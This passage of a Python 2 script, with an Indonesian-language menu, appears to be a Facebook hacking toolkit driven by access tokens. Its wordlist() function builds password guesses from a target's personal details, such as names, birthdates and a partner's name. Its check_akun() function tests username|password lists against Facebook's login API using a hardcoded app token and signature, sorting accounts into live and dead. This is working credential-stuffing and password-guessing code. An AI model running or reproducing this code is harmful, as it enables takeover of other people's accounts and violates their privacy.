            pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            cok = json.loads(pek.text)
            for i in cok['data']:
                nama = i['name']
                id = i['id']
                requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
                print '\x1b[1;97m[\x1b[1;92mMenghapus\x1b[1;97m] ' + nama + ' => ' + id

        except IndexError:
            pass
        except KeyboardInterrupt:
            print '\x1b[1;91m[!] Berhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_bot()


def lain():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. Buat Sebuah Status'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. Buat Sebuah Wordlist'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. Akun Checker'
    print '\xe2\x95\x91-> \x1b[1;37;40m4. Daftar Grup'
    print '\xe2\x95\x91-> \x1b[1;37;40m5. Profile Guard'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    pilih_lain()


def pilih_lain():
    other = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if other == '':
        print "\x1b[1;91m[!] Can't empty"
        pilih_lain()
    elif other == '1':
        status()
    elif other == '2':
        wordlist()
    elif other == '3':
        check_akun()
    elif other == '4':
        grupsaya()
    elif other == '5':
        guard()
    elif other == '0':
        menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + other + ' \x1b[1;91mTidak Ditemukan'
        pilih_lain()


def status():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mTulis Sebuah Status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print "\x1b[1;91m[!] Can't empty"
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()


def wordlist():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;92mIsi data lengkap target dibawah'
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            a = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Depan \x1b[1;97m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Tengah \x1b[1;97m: ')
            c = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Belakang \x1b[1;97m: ')
            d = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan \x1b[1;97m: ')
            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
            i = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Pacar \x1b[1;97m: ')
            j = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan Pacar \x1b[1;97m: ')
            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97m %s.txt' % a
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except IOError as e:
            print '\x1b[1;91m[!] Membuat File Gagal'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()


def check_akun():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97mUsername | Password'
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
            list = open(file, 'r').readlines()
        except IOError:
            print '\x1b[1;91m[!] File tidak Ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mSeparator \x1b[1;91m:\x1b[1;97m ')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
        else:
            die.append(password)
            print '\x1b[1;97m[\x1b[1;91mDie\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password

    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    lain()


def grupsaya():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 52 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Grup \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()


def guard():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. Pasang'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. Copot'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    g = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    elif g == '2':
        non = 'false'
        gaz(toket, non)
    elif g == '0':
        lain()
    elif g == '':
        keluar()
    else:
        keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTerpasang'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()
    elif '"is_shielded":false' in res.text:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDilepaskan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()
    else:
        print '\x1b[1;91m[!] Error'
        keluar()


if __name__ == '__main__':
    siapa()